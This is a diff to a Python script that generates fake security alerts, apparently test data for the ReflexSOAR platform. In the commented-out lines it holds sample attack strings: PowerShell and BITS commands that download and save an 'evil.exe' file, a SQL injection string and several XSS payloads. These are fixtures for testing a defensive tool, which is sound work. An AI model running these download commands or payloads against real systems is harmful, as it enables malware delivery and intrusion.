@@ -1,10 +1,13 @@
 import json
-import random
 import datetime
 import hashlib
 import base64
 import requests
 import time
+import random
+import socket
+import struct
+
 
 host = 'http://localhost'
 
@@ -111,17 +114,21 @@ def random_enumeration_command():
 
   return commands[random.randint(0,len(commands)-1)]
 
+def random_ip():
+  return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+
 def random_powershell_command():
   commands = [
-    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
-    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
-    'administrator") OR 1=1 --;',
-    'alert(1);',
-    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
-    '<IMG SRC="javascript:alert(\'XSS\');">',
-    '<IMG SRC=javascript:alert(\'XSS\')>',
-    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
-    '<script>alert(\'xss\')</script>'
+    #'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
+    #'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
+    #'administrator") OR 1=1 --;',
+    #'alert(1);',
+    #'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
+    #'<IMG SRC="javascript:alert(\'XSS\');">',
+    #'<IMG SRC=javascript:alert(\'XSS\')>',
+    #'<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
+    #'<script>alert(\'xss\')</script>'
+    '<iframe src="http://docs.reflexsoar.com/en/latest/"/>'
   ]
 
   return commands[random.randint(0, len(commands)-1)]
@@ -133,6 +140,7 @@ def random_event():
   signature_values = [alert_title, username, hostname]
   event_hasher = hashlib.md5()
   event_hasher.update(str(signature_values).encode())
+  ip = random_ip()
   
   alerts = [
     {
@@ -210,9 +218,23 @@ def random_event():
           "tags": [
             "command"
           ]
+        },
+        {
+          "value": ip,
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "ip",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall",
+            "source-ip"
+          ]
         }
       ],
-      "raw_log": "something something dark side"
+      "raw_log": json.dumps({"destination":{"ip": ip}})
+      
     }
   ]
 
